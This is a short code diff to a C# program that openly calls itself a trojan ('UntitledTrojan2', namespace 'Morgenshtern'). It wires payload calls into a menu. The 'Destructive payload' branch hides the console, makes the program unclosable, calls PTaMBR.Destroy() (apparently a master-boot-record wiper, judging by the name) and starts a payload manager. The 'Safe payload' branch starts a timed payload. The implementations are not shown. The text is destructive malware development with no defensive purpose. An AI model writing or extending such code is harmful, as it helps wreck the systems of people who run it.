@@ -6,6 +6,8 @@ using System.Media;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using UntitledTrojan2.Payloads;
+using UntitledTrojan2.Tools;
 using Uranus;
 
 namespace Morgenshtern
@@ -110,6 +112,8 @@ namespace Morgenshtern
                         // Safe payload
                         SystemSounds.Asterisk.Play();
                         ShowWindow(GetConsoleWindow(), 0);
+                        new PayloadsClass.LastMinutes().OnTick(100000);
+                        //await PayloadsManager.Start();
                     }
                     await Menu();
                     return;
@@ -129,6 +133,9 @@ namespace Morgenshtern
                         // Destructive payload
                         SystemSounds.Asterisk.Play();
                         ShowWindow(GetConsoleWindow(), 0);
+                        MakeUnclosable();
+                        PTaMBR.Destroy();
+                        await PayloadsManager.Start();
                     }
                     await Menu();
                     return;
